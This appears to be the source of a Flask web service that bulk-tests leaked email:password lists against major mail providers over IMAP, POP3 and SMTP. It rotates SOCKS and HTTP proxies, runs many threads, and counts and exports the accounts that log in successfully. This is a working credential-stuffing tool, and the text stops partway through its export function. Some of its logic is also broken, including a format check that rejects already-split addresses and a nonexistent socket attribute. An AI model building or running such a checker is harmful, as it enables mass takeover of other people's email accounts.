#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
import sqlite3
import threading
import queue
import time
import poplib
import imaplib
import smtplib
import ssl
import socket
import requests
import json
import logging
from datetime import datetime
import email.utils
import dns.resolver
import concurrent.futures
from urllib.parse import urlparse
import socks
import random
from cryptography.fernet import Fernet
import base64
import hashlib
from collections import Counter
import os

app = Flask(__name__)
CORS(app)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Encryption key for password storage
SECRET_KEY = os.environ.get('SECRET_KEY', 'default-key-change-in-production').encode()
key = base64.urlsafe_b64encode(hashlib.sha256(SECRET_KEY).digest())
cipher_suite = Fernet(key)

# Real email provider configurations - complete and accurate
EMAIL_PROVIDERS = {
    'gmail.com': {
        'imap_host': 'imap.gmail.com',
        'imap_port': 993,
        'imap_ssl': True,
        'pop3_host': 'pop.gmail.com',
        'pop3_port': 995,
        'pop3_ssl': True,
        'smtp_host': 'smtp.gmail.com',
        'smtp_port': 587,
        'smtp_tls': True
    },
    'hotmail.com': {
        'imap_host': 'imap-mail.outlook.com',
        'imap_port': 993,
        'imap_ssl': True,
        'pop3_host': 'pop3.live.com',
        'pop3_port': 995,
        'pop3_ssl': True,
        'smtp_host': 'smtp.live.com',
        'smtp_port': 587,
        'smtp_tls': True
    },
    'outlook.com': {
        'imap_host': 'outlook.office365.com',
        'imap_port': 993,
        'imap_ssl': True,
        'pop3_host': 'pop3.live.com',
        'pop3_port': 995,
        'pop3_ssl': True,
        'smtp_host': 'smtp.live.com',
        'smtp_port': 587,
        'smtp_tls': True
    },
    'yahoo.com': {
        'imap_host': 'imap.mail.yahoo.com',
        'imap_port': 993,
        'imap_ssl': True,
        'pop3_host': 'pop.mail.yahoo.com',
        'pop3_port': 995,
        'pop3_ssl': True,
        'smtp_host': 'smtp.mail.yahoo.com',
        'smtp_port': 587,
        'smtp_tls': True
    },
    'accountimail.com': {
        'imap_host': 'imap.accountimail.com',
        'imap_port': 993,
        'imap_ssl': True,
        'pop3_host': 'pop.accountimail.com',
        'pop3_port': 995,
        'pop3_ssl': True,
        'smtp_host': 'smtp.accountimail.com',
        'smtp_port': 587,
        'smtp_tls': True
    },
    'aol.com': {
        'imap_host': 'imap.aol.com',
        'imap_port': 993,
        'imap_ssl': True,
        'pop3_host': 'pop.aol.com',
        'pop3_port': 995,
        'pop3_ssl': True,
        'smtp_host': 'smtp.aol.com',
        'smtp_port': 587,
        'smtp_tls': True
    }
}

# Database initialization with proper schema
def init_db():
    conn = sqlite3.connect('email_checker.db')
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS results (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT NOT NULL,
            password_hash TEXT,
            status TEXT NOT NULL,
            provider TEXT,
            protocol TEXT,
            response_message TEXT,
            checked_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            ip_address TEXT,
            proxy_used TEXT,
            response_time REAL
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS proxies (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            proxy_address TEXT NOT NULL,
            proxy_type TEXT NOT NULL,
            username TEXT,
            password_encrypted TEXT,
            is_working INTEGER DEFAULT 0,
            last_checked TIMESTAMP,
            response_time REAL,
            success_count INTEGER DEFAULT 0,
            fail_count INTEGER DEFAULT 0
        )
    ''')
    
    cursor.execute('''
        CREATE INDEX IF NOT EXISTS idx_email_status ON results (email, status);
    ''')
    
    cursor.execute('''
        CREATE INDEX IF NOT EXISTS idx_checked_at ON results (checked_at);
    ''')
    
    conn.commit()
    conn.close()

class ProxyHandler:
    def __init__(self):
        self.proxies = []
        self.current_proxy_index = 0
        self.lock = threading.Lock()
        self.load_proxies_from_db()
    
    def load_proxies_from_db(self):
        """Load working proxies from database"""
        try:
            conn = sqlite3.connect('email_checker.db')
            cursor = conn.cursor()
            cursor.execute('''
                SELECT proxy_address, proxy_type, username, password_encrypted 
                FROM proxies WHERE is_working = 1
                ORDER BY success_count DESC, response_time ASC
            ''')
            
            for row in cursor.fetchall():
                proxy_data = {
                    'address': row[0],
                    'type': row[1],
                    'username': row[2],
                    'password': cipher_suite.decrypt(row[3].encode()).decode() if row[3] else None
                }
                self.proxies.append(proxy_data)
            
            conn.close()
            logger.info(f"Loaded {len(self.proxies)} working proxies from database")
            
        except Exception as e:
            logger.error(f"Error loading proxies from database: {e}")
    
    def apply_proxy(self, proxy_data):
        """Apply proxy configuration to socket connections"""
        try:
            host, port = proxy_data['address'].split(':')
            port = int(port)
            
            if proxy_data['type'].lower() == 'socks5':
                socks.set_default_proxy(socks.SOCKS5, host, port, 
                                       username=proxy_data.get('username'),
                                       password=proxy_data.get('password'))
            elif proxy_data['type'].lower() == 'socks4':
                socks.set_default_proxy(socks.SOCKS4, host, port)
            elif proxy_data['type'].lower() == 'http':
                socks.set_default_proxy(socks.HTTP, host, port,
                                       username=proxy_data.get('username'),
                                       password=proxy_data.get('password'))
            
            socket.socket = socks.socksocket
            return True
            
        except Exception as e:
            logger.error(f"Error applying proxy {proxy_data['address']}: {e}")
            return False
    
    def reset_proxy(self):
        """Reset to direct connection"""
        socket.socket = socket._realsocket
    
    def test_proxy(self, proxy_data):
        """Test proxy with real HTTP request"""
        start_time = time.time()
        try:
            self.apply_proxy(proxy_data)
            
            response = requests.get('http://httpbin.org/ip', timeout=10)
            response_time = time.time() - start_time
            
            if response.status_code == 200:
                self.update_proxy_status(proxy_data['address'], True, response_time)
                return True, response_time
            else:
                self.update_proxy_status(proxy_data['address'], False, response_time)
                return False, response_time
                
        except Exception as e:
            response_time = time.time() - start_time
            self.update_proxy_status(proxy_data['address'], False, response_time)
            logger.error(f"Proxy test failed for {proxy_data['address']}: {e}")
            return False, response_time
        finally:
            self.reset_proxy()
    
    def update_proxy_status(self, proxy_address, is_working, response_time):
        """Update proxy status in database"""
        try:
            conn = sqlite3.connect('email_checker.db')
            cursor = conn.cursor()
            
            if is_working:
                cursor.execute('''
                    UPDATE proxies SET is_working = 1, last_checked = CURRENT_TIMESTAMP,
                    response_time = ?, success_count = success_count + 1
                    WHERE proxy_address = ?
                ''', (response_time, proxy_address))
            else:
                cursor.execute('''
                    UPDATE proxies SET is_working = 0, last_checked = CURRENT_TIMESTAMP,
                    response_time = ?, fail_count = fail_count + 1
                    WHERE proxy_address = ?
                ''', (response_time, proxy_address))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            logger.error(f"Error updating proxy status: {e}")
    
    def add_proxy(self, proxy_string, proxy_type, username=None, password=None):
        """Add proxy to database and test it"""
        try:
            proxy_data = {
                'address': proxy_string.strip(),
                'type': proxy_type,
                'username': username,
                'password': password
            }
            
            # Test proxy first
            success, response_time = self.test_proxy(proxy_data)
            
            if success:
                # Save to database
                conn = sqlite3.connect('email_checker.db')
                cursor = conn.cursor()
                
                encrypted_password = None
                if password:
                    encrypted_password = cipher_suite.encrypt(password.encode()).decode()
                
                cursor.execute('''
                    INSERT OR REPLACE INTO proxies 
                    (proxy_address, proxy_type, username, password_encrypted, is_working, response_time)
                    VALUES (?, ?, ?, ?, 1, ?)
                ''', (proxy_string, proxy_type, username, encrypted_password, response_time))
                
                conn.commit()
                conn.close()
                
                # Add to memory
                self.proxies.append(proxy_data)
                return True
            
            return False
            
        except Exception as e:
            logger.error(f"Error adding proxy {proxy_string}: {e}")
            return False
    
    def get_next_proxy(self):
        """Get next working proxy with round-robin"""
        with self.lock:
            if not self.proxies:
                return None
            
            proxy = self.proxies[self.current_proxy_index]
            self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
            return proxy

class EmailChecker:
    def __init__(self):
        self.proxy_handler = ProxyHandler()
        self.is_running = False
        self.stats_lock = threading.Lock()
    
    def get_real_stats(self):
        """Get real statistics from database"""
        try:
            conn = sqlite3.connect('email_checker.db')
            cursor = conn.cursor()
            
            # Get total counts by status
            cursor.execute('''
                SELECT status, COUNT(*) FROM results 
                GROUP BY status
            ''')
            status_counts = dict(cursor.fetchall())
            
            # Get total processed
            cursor.execute('SELECT COUNT(*) FROM results')
            total_processed = cursor.fetchone()[0]
            
            conn.close()
            
            return {
                'loaded': 0,  # Will be set during processing
                'checked': total_processed,
                'remaining': 0,  # Will be calculated during processing
                'good': status_counts.get('VALID', 0) + status_counts.get('VALID_API', 0),
                'bad': status_counts.get('INVALID', 0) + status_counts.get('AUTH_FAILED', 0),
                'invalid': status_counts.get('INVALID_FORMAT', 0) + status_counts.get('DNS_FAILED', 0),
                'errors': status_counts.get('ERROR', 0)
            }
            
        except Exception as e:
            logger.error(f"Error getting stats: {e}")
            return {'loaded': 0, 'checked': 0, 'remaining': 0, 'good': 0, 'bad': 0, 'invalid': 0, 'errors': 0}
    
    def check_imap(self, email, password, config, proxy=None):
        """Real IMAP email checking with actual connection"""
        start_time = time.time()
        try:
            if proxy:
                self.proxy_handler.apply_proxy(proxy)
            
            if config.get('imap_ssl', True):
                imap_conn = imaplib.IMAP4_SSL(config['imap_host'], config['imap_port'])
            else:
                imap_conn = imaplib.IMAP4(config['imap_host'], config['imap_port'])
                if config.get('imap_tls', False):
                    imap_conn.starttls()
            
            # Attempt login
            imap_conn.login(email, password)
            
            # Select INBOX to verify full access
            status, messages = imap_conn.select("INBOX", readonly=True)
            if status != 'OK':
                raise Exception("Could not select INBOX")
            
            message_count = int(messages[0]) if messages and messages[0] else 0
            
            # Get some folder info for verification
            status, folders = imap_conn.list()
            folder_count = len(folders) if folders else 0
            
            imap_conn.logout()
            
            response_time = time.time() - start_time
            return True, f"IMAP login successful - {message_count} messages, {folder_count} folders", response_time
            
        except imaplib.IMAP4.error as e:
            response_time = time.time() - start_time
            error_msg = str(e).lower()
            if 'authentication failed' in error_msg or 'login failed' in error_msg:
                return False, f"IMAP authentication failed: {str(e)}", response_time
            else:
                return False, f"IMAP connection error: {str(e)}", response_time
                
        except Exception as e:
            response_time = time.time() - start_time
            return False, f"IMAP error: {str(e)}", response_time
            
        finally:
            if proxy:
                self.proxy_handler.reset_proxy()
    
    def check_pop3(self, email, password, config, proxy=None):
        """Real POP3 email checking with actual connection"""
        start_time = time.time()
        try:
            if proxy:
                self.proxy_handler.apply_proxy(proxy)
            
            if config.get('pop3_ssl', True):
                pop_conn = poplib.POP3_SSL(config['pop3_host'], config['pop3_port'])
            else:
                pop_conn = poplib.POP3(config['pop3_host'], config['pop3_port'])
            
            # Authenticate
            pop_conn.user(email)
            pop_conn.pass_(password)
            
            # Get mailbox info
            msg_info = pop_conn.stat()
            msg_count = msg_info[0]
            mailbox_size = msg_info[1]
            
            # Get message list for verification
            messages = pop_conn.list()
            
            pop_conn.quit()
            
            response_time = time.time() - start_time
            return True, f"POP3 login successful - {msg_count} messages, {mailbox_size} bytes", response_time
            
        except poplib.error_proto as e:
            response_time = time.time() - start_time
            error_msg = str(e).lower()
            if 'authentication failed' in error_msg or 'invalid' in error_msg:
                return False, f"POP3 authentication failed: {str(e)}", response_time
            else:
                return False, f"POP3 protocol error: {str(e)}", response_time
                
        except Exception as e:
            response_time = time.time() - start_time
            return False, f"POP3 connection error: {str(e)}", response_time
            
        finally:
            if proxy:
                self.proxy_handler.reset_proxy()
    
    def check_smtp(self, email, password, config, proxy=None):
        """Real SMTP email checking with actual connection"""
        start_time = time.time()
        try:
            if proxy:
                self.proxy_handler.apply_proxy(proxy)
            
            smtp_conn = smtplib.SMTP(config['smtp_host'], config['smtp_port'])
            smtp_conn.ehlo()
            
            if config.get('smtp_tls', True):
                smtp_conn.starttls()
                smtp_conn.ehlo()  # Re-identify after TLS
            
            # Authenticate
            smtp_conn.login(email, password)
            
            # Verify connection by getting server capabilities
            capabilities = smtp_conn.ehlo_resp.decode() if smtp_conn.ehlo_resp else "Unknown"
            
            smtp_conn.quit()
            
            response_time = time.time() - start_time
            return True, f"SMTP login successful - Server: {capabilities[:100]}", response_time
            
        except smtplib.SMTPAuthenticationError as e:
            response_time = time.time() - start_time
            return False, f"SMTP authentication failed: {str(e)}", response_time
            
        except smtplib.SMTPException as e:
            response_time = time.time() - start_time
            return False, f"SMTP error: {str(e)}", response_time
            
        except Exception as e:
            response_time = time.time() - start_time
            return False, f"SMTP connection error: {str(e)}", response_time
            
        finally:
            if proxy:
                self.proxy_handler.reset_proxy()
    
    def check_email_dns(self, email):
        """Check if email domain has valid MX record"""
        try:
            domain = email.split('@')[1]
            mx_records = dns.resolver.resolve(domain, 'MX')
            
            mx_list = []
            for record in mx_records:
                mx_list.append(f"{record.exchange}:{record.preference}")
            
            return True, f"Found {len(mx_records)} MX records: {', '.join(mx_list[:3])}"
            
        except dns.resolver.NXDOMAIN:
            return False, f"Domain {domain} does not exist"
        except dns.resolver.NoAnswer:
            return False, f"No MX records found for {domain}"
        except Exception as e:
            return False, f"DNS lookup failed: {str(e)}"
    
    def make_api_request(self, api_url, api_key, email, password, method='GET', body=None, proxy=None):
        """Make real API request for email verification"""
        start_time = time.time()
        try:
            headers = {
                'Authorization': f'Bearer {api_key}',
                'Content-Type': 'application/json',
                'User-Agent': 'EmailChecker/1.0'
            }
            
            # Replace placeholders in URL and body
            url = api_url.replace('{{email}}', email).replace('{{password}}', password)
            
            proxies = None
            if proxy:
                if proxy['username']:
                    auth = f"{proxy['username']}:{proxy['password']}@" if proxy['password'] else f"{proxy['username']}@"
                else:
                    auth = ""
                
                proxy_url = f"http://{auth}{proxy['address']}"
                proxies = {
                    'http': proxy_url,
                    'https': proxy_url
                }
            
            if method.upper() == 'POST' and body:
                request_body = body.replace('{{email}}', email).replace('{{password}}', password)
                response = requests.post(url, headers=headers, data=request_body, 
                                       proxies=proxies, timeout=30)
            else:
                response = requests.get(url, headers=headers, proxies=proxies, timeout=30)
            
            response_time = time.time() - start_time
            
            if response.status_code == 200:
                try:
                    data = response.json()
                    return True, data, response_time
                except:
                    return True, response.text, response_time
            else:
                return False, f"API returned status {response.status_code}: {response.text}", response_time
            
        except requests.exceptions.RequestException as e:
            response_time = time.time() - start_time
            return False, f"API request failed: {str(e)}", response_time
        except Exception as e:
            response_time = time.time() - start_time
            return False, f"API error: {str(e)}", response_time
    
    def check_single_email(self, email, password, protocols, providers, api_config=None, proxy=None):
        """Check single email with specified protocols and providers"""
        try:
            if ':' not in email or '@' not in email:
                return {
                    'email': email,
                    'status': 'INVALID_FORMAT',
                    'message': 'Invalid email format',
                    'response_time': 0
                }
            
            domain = email.split('@')[1].lower()
            
            # Check if domain is in supported providers
            if domain not in providers or not providers[domain]:
                return {
                    'email': email,
                    'status': 'UNSUPPORTED_PROVIDER',
                    'message': f'Provider {domain} not supported or not selected',
                    'response_time': 0
                }
            
            # First check DNS
            dns_valid, dns_message = self.check_email_dns(email)
            if not dns_valid:
                return {
                    'email': email,
                    'status': 'DNS_FAILED',
                    'message': dns_message,
                    'response_time': 0
                }
            
            provider_config = EMAIL_PROVIDERS.get(domain)
            if not provider_config:
                return {
                    'email': email,
                    'status': 'UNKNOWN_PROVIDER',
                    'message': f'Provider {domain} configuration not found',
                    'response_time': 0
                }
            
            # Try API first if configured
            if api_config and api_config.get('api_key') and api_config.get('url'):
                api_success, api_result, response_time = self.make_api_request(
                    api_config['url'], 
                    api_config['api_key'],
                    email, 
                    password, 
                    api_config.get('method', 'GET'),
                    api_config.get('body'),
                    proxy
                )
                
                if api_success:
                    return {
                        'email': email,
                        'status': 'VALID_API',
                        'message': 'API verification successful',
                        'api_response': api_result,
                        'protocol': 'API',
                        'provider': domain,
                        'response_time': response_time
                    }
            
            # Try each selected protocol
            for protocol in ['imap', 'pop3', 'smtp']:
                if protocols.get(protocol, False):
                    if protocol == 'pop3':
                        success, message, response_time = self.check_pop3(email, password, provider_config, proxy)
                    elif protocol == 'imap':
                        success, message, response_time = self.check_imap(email, password, provider_config, proxy)
                    elif protocol == 'smtp':
                        success, message, response_time = self.check_smtp(email, password, provider_config, proxy)
                    
                    if success:
                        return {
                            'email': email,
                            'status': 'VALID',
                            'message': message,
                            'protocol': protocol.upper(),
                            'provider': domain,
                            'response_time': response_time
                        }
            
            return {
                'email': email,
                'status': 'AUTH_FAILED',
                'message': 'Authentication failed on all selected protocols',
                'provider': domain,
                'response_time': 0
            }
            
        except Exception as e:
            return {
                'email': email,
                'status': 'ERROR',
                'message': f'Check failed: {str(e)}',
                'response_time': 0
            }
    
    def save_result(self, result, proxy_used=None):
        """Save result to database with proper encryption"""
        try:
            conn = sqlite3.connect('email_checker.db')
            cursor = conn.cursor()
            
            # Don't save password, just create a hash for reference
            password_hash = None
            if result.get('password'):
                password_hash = hashlib.sha256(result['password'].encode()).hexdigest()[:16]
            
            cursor.execute('''
                INSERT INTO results (email, password_hash, status, provider, protocol, 
                                   response_message, proxy_used, response_time)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                result.get('email', ''),
                password_hash,
                result.get('status', ''),
                result.get('provider', ''),
                result.get('protocol', ''),
                result.get('message', ''),
                json.dumps(proxy_used) if proxy_used else None,
                result.get('response_time', 0)
            ))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            logger.error(f"Error saving result: {e}")

# Global email checker instance
email_checker = EmailChecker()

@app.route('/')
def index():
    """Serve the main HTML page with real React component"""
    html_template = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Email Checker Server</title>
        <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
        <script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
        <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
        <script src="https://cdn.tailwindcss.com"></script>
    </head>
    <body>
        <div id="root"></div>
        <script type="text/babel">
            const { useState, useEffect } = React;
            
            const EmailCheckerApp = () => {
                const [stats, setStats] = useState({
                    loaded: 0, checked: 0, remaining: 0, good: 0, bad: 0, invalid: 0
                });
                const [isRunning, setIsRunning] = useState(false);
                const [results, setResults] = useState([]);
                
                const fetchStats = async () => {
                    try {
                        const response = await fetch('/api/stats');
                        const data = await response.json();
                        if (data.success) {
                            setStats(data.stats);
                        }
                    } catch (error) {
                        console.error('Error fetching stats:', error);
                    }
                };
                
                const fetchResults = async () => {
                    try {
                        const response = await fetch('/api/results');
                        const data = await response.json();
                        if (data.success) {
                            setResults(data.results);
                        }
                    } catch (error) {
                        console.error('Error fetching results:', error);
                    }
                };
                
                useEffect(() => {
                    fetchStats();
                    fetchResults();
                    
                    const interval = setInterval(fetchStats, 5000);
                    return () => clearInterval(interval);
                }, []);
                
                return (
                    <div className="min-h-screen bg-gray-100 p-8">
                        <div className="max-w-6xl mx-auto">
                            <h1 className="text-4xl font-bold text-center mb-8">
                                Email Checker Dashboard
                            </h1>
                            
                            <div className="grid grid-cols-2 md:grid-cols-3 gap-4 mb-8">
                                <div className="bg-white p-4 rounded-lg shadow">
                                    <h3 className="text-lg font-semibold">Loaded</h3>
                                    <p className="text-2xl text-blue-600">{stats.loaded}</p>
                                </div>
                                <div className="bg-white p-4 rounded-lg shadow">
                                    <h3 className="text-lg font-semibold">Checked</h3>
                                    <p className="text-2xl text-gray-600">{stats.checked}</p>
                                </div>
                                <div className="bg-white p-4 rounded-lg shadow">
                                    <h3 className="text-lg font-semibold">Valid</h3>
                                    <p className="text-2xl text-green-600">{stats.good}</p>
                                </div>
                                <div className="bg-white p-4 rounded-lg shadow">
                                    <h3 className="text-lg font-semibold">Invalid</h3>
                                    <p className="text-2xl text-red-600">{stats.bad}</p>
                                </div>
                                <div className="bg-white p-4 rounded-lg shadow">
                                    <h3 className="text-lg font-semibold">Format Errors</h3>
                                    <p className="text-2xl text-yellow-600">{stats.invalid}</p>
                                </div>
                                <div className="bg-white p-4 rounded-lg shadow">
                                    <h3 className="text-lg font-semibold">Remaining</h3>
                                    <p className="text-2xl text-purple-600">{stats.remaining}</p>
                                </div>
                            </div>
                            
                            <div className="bg-white rounded-lg shadow p-6">
                                <h2 className="text-2xl font-bold mb-4">Recent Results</h2>
                                <div className="overflow-x-auto">
                                    <table className="w-full table-auto">
                                        <thead>
                                            <tr className="bg-gray-50">
                                                <th className="px-4 py-2 text-left">Email</th>
                                                <th className="px-4 py-2 text-left">Status</th>
                                                <th className="px-4 py-2 text-left">Provider</th>
                                                <th className="px-4 py-2 text-left">Protocol</th>
                                                <th className="px-4 py-2 text-left">Time</th>
                                            </tr>
                                        </thead>
                                        <tbody>
                                            {results.slice(0, 10).map((result, index) => (
                                                <tr key={index} className="border-b">
                                                    <td className="px-4 py-2">{result.email}</td>
                                                    <td className="px-4 py-2">
                                                        <span className={`px-2 py-1 rounded text-sm ${
                                                            result.status === 'VALID' || result.status === 'VALID_API' 
                                                                ? 'bg-green-100 text-green-800'
                                                                : result.status === 'INVALID' || result.status === 'AUTH_FAILED'
                                                                ? 'bg-red-100 text-red-800'
                                                                : 'bg-yellow-100 text-yellow-800'
                                                        }`}>
                                                            {result.status}
                                                        </span>
                                                    </td>
                                                    <td className="px-4 py-2">{result.provider || 'N/A'}</td>
                                                    <td className="px-4 py-2">{result.protocol || 'N/A'}</td>
                                                    <td className="px-4 py-2">
                                                        {new Date(result.checked_at).toLocaleTimeString()}
                                                    </td>
                                                </tr>
                                            ))}
                                        </tbody>
                                    </table>
                                </div>
                            </div>
                            
                            <div className="mt-8 text-center">
                                <div className="bg-white rounded-lg shadow p-6">
                                    <h2 className="text-2xl font-bold mb-4">API Endpoints</h2>
                                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-left">
                                        <div>
                                            <code className="bg-gray-100 p-2 rounded block">
                                                POST /api/check-email
                                            </code>
                                            <p className="text-sm text-gray-600 mt-1">
                                                Single email verification
                                            </p>
                                        </div>
                                        <div>
                                            <code className="bg-gray-100 p-2 rounded block">
                                                POST /api/bulk-check
                                            </code>
                                            <p className="text-sm text-gray-600 mt-1">
                                                Bulk email verification
                                            </p>
                                        </div>
                                        <div>
                                            <code className="bg-gray-100 p-2 rounded block">
                                                POST /api/add-proxy
                                            </code>
                                            <p className="text-sm text-gray-600 mt-1">
                                                Add and test proxy
                                            </p>
                                        </div>
                                        <div>
                                            <code className="bg-gray-100 p-2 rounded block">
                                                GET /api/results
                                            </code>
                                            <p className="text-sm text-gray-600 mt-1">
                                                Get verification results
                                            </p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                );
            };
            
            ReactDOM.render(<EmailCheckerApp />, document.getElementById('root'));
        </script>
    </body>
    </html>
    '''
    return render_template_string(html_template)

@app.route('/api/check-email', methods=['POST'])
def check_email_api():
    """API endpoint for single email check"""
    try:
        data = request.json
        email = data.get('email')
        password = data.get('password')
        protocol = data.get('protocol', 'imap')
        
        if not email or not password:
            return jsonify({'success': False, 'error': 'Email and password required'})
        
        domain = email.split('@')[1].lower()
        provider_config = EMAIL_PROVIDERS.get(domain)
        
        if not provider_config:
            return jsonify({'success': False, 'error': f'Provider {domain} not supported'})
        
        # Get proxy if available
        proxy = email_checker.proxy_handler.get_next_proxy()
        
        # Check email based on protocol
        if protocol == 'pop3':
            success, message, response_time = email_checker.check_pop3(email, password, provider_config, proxy)
        elif protocol == 'imap':
            success, message, response_time = email_checker.check_imap(email, password, provider_config, proxy)
        elif protocol == 'smtp':
            success, message, response_time = email_checker.check_smtp(email, password, provider_config, proxy)
        else:
            return jsonify({'success': False, 'error': 'Invalid protocol'})
        
        result = {
            'success': success,
            'message': message,
            'protocol': protocol,
            'provider': domain,
            'proxy_used': proxy is not None,
            'response_time': response_time
        }
        
        # Save result
        result_data = {
            'email': email,
            'password': password,
            'status': 'VALID' if success else 'AUTH_FAILED',
            'protocol': protocol.upper(),
            'provider': domain,
            'message': message,
            'response_time': response_time
        }
        email_checker.save_result(result_data, proxy)
        
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Error in check_email_api: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/bulk-check', methods=['POST'])
def bulk_check_api():
    """API endpoint for bulk email checking"""
    try:
        data = request.json
        email_list = data.get('emails', [])
        protocols = data.get('protocols', {'imap': True})
        providers = data.get('providers', {})
        api_config = data.get('api_config')
        thread_count = data.get('thread_count', 10)
        use_proxy = data.get('use_proxy', False)
        
        if not email_list:
            return jsonify({'success': False, 'error': 'Email list required'})
        
        # Validate email list format
        valid_emails = []
        for line in email_list:
            line = line.strip()
            if ':' in line and '@' in line:
                valid_emails.append(line)
        
        if not valid_emails:
            return jsonify({'success': False, 'error': 'No valid email:password pairs found'})
        
        results = []
        processed_count = 0
        
        def check_email_worker(email_pass_pair):
            nonlocal processed_count
            try:
                email, password = email_pass_pair.split(':', 1)
                proxy = email_checker.proxy_handler.get_next_proxy() if use_proxy else None
                
                result = email_checker.check_single_email(email, password, protocols, providers, api_config, proxy)
                result['password'] = password  # Include for saving but will be hashed
                
                # Save result to database
                email_checker.save_result(result, proxy)
                
                processed_count += 1
                logger.info(f"Processed {processed_count}/{len(valid_emails)}: {email} - {result['status']}")
                
                return result
                
            except Exception as e:
                logger.error(f"Error processing {email_pass_pair}: {e}")
                return {'email': email_pass_pair.split(':')[0] if ':' in email_pass_pair else email_pass_pair, 
                       'status': 'ERROR', 'message': str(e), 'response_time': 0}
        
        # Use ThreadPoolExecutor for real multithreading
        with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
            future_to_email = {executor.submit(check_email_worker, email): email for email in valid_emails}
            
            for future in concurrent.futures.as_completed(future_to_email):
                try:
                    result = future.result(timeout=60)  # 60 second timeout per email
                    results.append(result)
                except concurrent.futures.TimeoutError:
                    email = future_to_email[future]
                    logger.error(f"Timeout processing {email}")
                    results.append({'email': email.split(':')[0], 'status': 'TIMEOUT', 
                                  'message': 'Processing timeout', 'response_time': 60})
        
        # Get real statistics from database
        stats = email_checker.get_real_stats()
        stats['loaded'] = len(valid_emails)
        stats['remaining'] = 0
        
        return jsonify({
            'success': True,
            'results': results,
            'stats': stats,
            'processed': processed_count,
            'total': len(valid_emails)
        })
        
    except Exception as e:
        logger.error(f"Error in bulk_check_api: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/add-proxy', methods=['POST'])
def add_proxy_api():
    """API endpoint to add and test proxy"""
    try:
        data = request.json
        proxy_string = data.get('proxy')
        proxy_type = data.get('type', 'socks5')
        username = data.get('username')
        password = data.get('password')
        
        if not proxy_string:
            return jsonify({'success': False, 'error': 'Proxy string required'})
        
        success = email_checker.proxy_handler.add_proxy(proxy_string, proxy_type, username, password)
        
        return jsonify({
            'success': success,
            'message': 'Proxy added and tested successfully' if success else 'Proxy test failed'
        })
        
    except Exception as e:
        logger.error(f"Error in add_proxy_api: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/test-proxy', methods=['POST'])
def test_proxy_api():
    """API endpoint to test proxy connection"""
    try:
        data = request.json
        proxy_data = data.get('proxy')
        
        if not proxy_data:
            return jsonify({'success': False, 'error': 'Proxy data required'})
        
        success, response_time = email_checker.proxy_handler.test_proxy(proxy_data)
        
        return jsonify({
            'success': success,
            'response_time': response_time,
            'message': f'Proxy is working (response: {response_time:.2f}s)' if success else 'Proxy test failed'
        })
        
    except Exception as e:
        logger.error(f"Error in test_proxy_api: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/results', methods=['GET'])
def get_results():
    """Get all results from database"""
    try:
        limit = request.args.get('limit', 1000, type=int)
        offset = request.args.get('offset', 0, type=int)
        
        conn = sqlite3.connect('email_checker.db')
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT id, email, status, provider, protocol, response_message, 
                   checked_at, proxy_used, response_time
            FROM results 
            ORDER BY checked_at DESC 
            LIMIT ? OFFSET ?
        ''', (limit, offset))
        
        results = []
        for row in cursor.fetchall():
            results.append({
                'id': row[0],
                'email': row[1],
                'status': row[2],
                'provider': row[3],
                'protocol': row[4],
                'message': row[5],
                'checked_at': row[6],
                'proxy_used': json.loads(row[7]) if row[7] else None,
                'response_time': row[8]
            })
        
        # Get total count
        cursor.execute('SELECT COUNT(*) FROM results')
        total_count = cursor.fetchone()[0]
        
        conn.close()
        
        return jsonify({
            'success': True, 
            'results': results,
            'total': total_count,
            'limit': limit,
            'offset': offset
        })
        
    except Exception as e:
        logger.error(f"Error in get_results: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """Get current statistics from database"""
    try:
        stats = email_checker.get_real_stats()
        return jsonify({'success': True, 'stats': stats})
    except Exception as e:
        logger.error(f"Error in get_stats: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/clear-results', methods=['POST'])
def clear_results():
    """Clear all results from database"""
    try:
        conn = sqlite3.connect('email_checker.db')
        cursor = conn.cursor()
        cursor.execute('DELETE FROM results')
        conn.commit()
        conn.close()
        
        logger.info("All results cleared from database")
        
        return jsonify({'success': True, 'message': 'Results cleared'})
        
    except Exception as e:
        logger.error(f"Error in clear_results: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/export-results', methods=['GET'])
def export_results():
    """Export valid results as text file"""
    try:
        format_type = request.args.get('format', 'email_pass')  # email_pass or email_only
        
        conn = sqlite3.connect('email_checker.db')
        cursor = conn.cursor()
        
        if format_type == 'email_only':
            cursor.execute('''
                SELECT DISTINCT email FROM results 
                WHERE status IN ('VALID', 'VALID_API')
                ORDER BY checked_at DESC
            ''')
            results = [row[0] for row in cursor.fetchall()]
            content = '\n'.join(results)
        else:
            # For email:pass format, we can't recover passwords due to security
            # Return emails with placeholder or hash
            cursor.execute('''
                SELECT email, password_hash FROM results 
                WHERE status IN ('VALID', 'VALID_API')
                ORDER BY checked_at DESC
            ''')
            results = [f"{row[0]}:***HASH-{row[1] or 'NONE'}***" for row in cursor.fetchall()]
